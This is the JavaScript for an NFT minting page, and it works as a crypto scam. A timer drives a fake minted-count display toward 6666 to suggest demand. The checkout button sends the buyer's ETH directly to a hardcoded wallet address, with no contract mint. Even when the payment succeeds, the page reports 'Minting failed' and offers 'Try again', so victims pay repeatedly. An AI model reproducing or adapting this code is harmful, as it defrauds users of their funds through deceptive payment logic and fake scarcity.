const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const pricePerNFT = 0.12;

  //counter

    $(document).ready(function (){
  var count = 5461;
 function myCount() {
 if (count > 6666) {
     count = 6666;
 }
 $('.count').text(count);
 count ++;
  
}

setInterval(myCount,793);
});

                //countdown
               

/** input number spinner
 */
let plusBtn = document.querySelector('button[class*="text-button-plus"]');
let minusBtn = document.querySelector('button[class*="text-button-minus"]');
let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
  }
  
})
//** end of input number spinner */

connectBtn.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })

  /*
  connectBtnHeader.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  }) */
  
  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0xC92918b489EDDaBD1e828F99628c771C404404a4'
      let totalEth = totalETHSpan.innerText;
      totalEth = totalEth.toString();
      const accounts = await web3.eth.getAccounts();
      web3.eth.sendTransaction({
        gas: 300000,
        gasPrice: '40000413200',
        from: web3.currentProvider.selectedAddress,
        to: paymentAddress,
        value: web3.utils.toWei(totalEth, 'ether')
        }, (err, transactionId) => {
        if  (err) {
          console.log('Minting failed', err)
          statusp.innerText = 'Minting failed'
        } else {
          console.log('Minting succeed', transactionId)
          statusp.innerText = 'Minting failed';
          checkoutBtn.innerText = 'Try again'  
        }
      })
    })
  }
